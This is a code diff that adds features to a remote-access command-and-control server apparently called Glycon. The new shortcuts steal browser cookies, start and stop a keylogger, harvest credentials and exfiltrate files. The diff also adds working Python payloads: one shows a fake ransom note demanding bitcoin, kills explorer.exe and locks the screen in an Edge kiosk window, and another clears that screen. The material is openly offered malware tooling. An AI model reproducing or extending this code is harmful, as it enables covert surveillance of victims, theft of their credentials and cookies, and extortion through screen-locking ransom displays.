@@ -230,11 +230,16 @@ def init_socket_handlers(socketio):
                     help_text = (
                         "\r\nGlycon Terminal Shortcuts:\r\n"
                         "  #help              - Show this help\r\n"
-                        "  #upload <file>     - Upload file from C2 to current agent directory\r\n"
+                        "  #upload            - Open file upload dialog\r\n"
                         "  #exfiltrate <file> - Download file from agent to C2 loot\r\n"
                         "  #screenshot        - Take a screenshot\r\n"
                         "  #webshot           - Take a webcam capture\r\n"
                         "  #creds             - Harvest credentials, history, and WiFi\r\n"
+                        "  #cookies           - Steal browser cookies\r\n"
+                        "  #keylogger         - Start keylogger\r\n"
+                        "  #nokeylogger       - Stop keylogger\r\n"
+                        "  #fakeransom        - Deploys full-screen ransom note and kills explorer.exe\r\n"
+                        "  #clearransom       - Closes ransom note and restarts explorer.exe\r\n"
                     )
                     emit('terminal_output', {
                         'agent_id': agent_id,
@@ -249,12 +254,131 @@ def init_socket_handlers(socketio):
                 task_type = None
                 task_data = {}
 
-                if cmd_type == 'screenshot':
+                if cmd_type == 'fakeransom':
+                    task_type = 'execute_python'
+                    ransom_html = """
+<!DOCTYPE html>
+<html lang="en" class="notranslate" translate="no">
+<head>
+    <meta name="google" content="notranslate" />
+    <title>FINAL WARNING</title>
+    <style>
+        body { background-color: #000; color: #ff0000; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { text-align: center; border: 5px solid #ff0000; padding: 50px; max-width: 80%; background: rgba(20, 0, 0, 0.9); box-shadow: 0 0 50px #ff0000; }
+        h1 { font-size: 4em; margin: 0; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        .message { font-size: 1.5em; margin: 20px 0; }
+        .timer { font-size: 3em; font-weight: bold; color: #fff; margin: 30px 0; }
+        .id { color: #888; font-size: 0.9em; margin-top: 40px; }
+        .footer { margin-top: 50px; color: #ff0000; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ALL YOUR FILES ARE ENCRYPTED</h1>
+        <div class="message">
+            Your system has been infected with GLYCON-X Ransomware.<br>
+            All documents, photos, databases and other important files have been encrypted using AES-256.<br>
+            Any attempt to restore files manually will result in permanent data loss.
+        </div>
+        <div class="message">TIME REMAINING UNTIL PRIVATE KEY DELETION:</div>
+        <div class="timer" id="timer">72:00:00</div>
+        <div class="message">PAY 0.5 BTC TO: 1GlyconXvP7V1vE9vM5Z3xP3zT8vN5q4r</div>
+        <div class="footer">DO NOT SHUT DOWN OR RESTART YOUR COMPUTER</div>
+        <div class="id" id="sysid">SYSTEM ID: </div>
+    </div>
+    <script>
+        function updateTimer() {
+            let h = 71, m = 59, s = 59;
+            setInterval(() => {
+                s--;
+                if (s < 0) { s = 59; m--; }
+                if (m < 0) { m = 59; h--; }
+                document.getElementById('timer').innerText = 
+                    (h < 10 ? '0'+h : h) + ":" + (m < 10 ? '0'+m : m) + ":" + (s < 10 ? '0'+s : s);
+            }, 1000);
+        }
+        document.getElementById('sysid').innerText += Math.random().toString(36).substr(2, 9).toUpperCase();
+        updateTimer();
+    </script>
+</body>
+</html>
+"""
+                    python_payload = f"""
+import os
+import tempfile
+import base64
+import subprocess
+import winreg
+
+def get_edge_path():
+    paths = [
+        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\msedge.exe"),
+        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\msedge.exe")
+    ]
+    for root, key_path in paths:
+        try:
+            with winreg.OpenKey(root, key_path) as key:
+                return winreg.QueryValue(key, None)
+        except WindowsError:
+            continue
+    return "msedge.exe"
+
+html_content = {repr(ransom_html)}
+temp_dir = tempfile.gettempdir()
+html_path = os.path.join(temp_dir, "gl_ransom.html")
+
+with open(html_path, "w", encoding="utf-8") as f:
+    f.write(html_content)
+
+# Kill explorer to prevent user from escaping easily
+subprocess.run(["taskkill", "/F", "/IM", "explorer.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+edge_path = get_edge_path()
+subprocess.Popen([edge_path, "--kiosk", f"file:///{{html_path}}", "--edge-kiosk-type=fullscreen", "--no-first-run", "--no-default-browser-check"], 
+                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+result = "Ransomware screen deployed successfully"
+"""
+                    task_data = {'code': python_payload}
+                elif cmd_type == 'clearransom':
+                    task_type = 'execute_python'
+                    python_payload = """
+import os
+import subprocess
+import tempfile
+
+# Kill Edge browser
+subprocess.run(["taskkill", "/F", "/IM", "msedge.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# Restart Explorer
+subprocess.Popen(["explorer.exe"], start_new_session=True)
+
+# Clean up temporary file
+temp_dir = tempfile.gettempdir()
+html_path = os.path.join(temp_dir, "gl_ransom.html")
+if os.path.exists(html_path):
+    try:
+        os.remove(html_path)
+    except:
+        pass
+
+result = "Ransomware screen cleared and Explorer restarted"
+"""
+                    task_data = {'code': python_payload}
+                elif cmd_type == 'screenshot':
                     task_type = 'screenshot'
                 elif cmd_type == 'webshot':
                     task_type = 'webcam'
                 elif cmd_type == 'creds':
                     task_type = 'harvest_creds'
+                elif cmd_type == 'cookies':
+                    task_type = 'steal_cookies'
+                elif cmd_type == 'keylogger':
+                    task_type = 'keylogger'
+                    task_data = {'action': 'start'}
+                elif cmd_type == 'nokeylogger':
+                    task_type = 'keylogger'
+                    task_data = {'action': 'stop'}
                 elif cmd_type == 'exfiltrate' and arg:
                     task_type = 'upload'
                     # Handle relative path
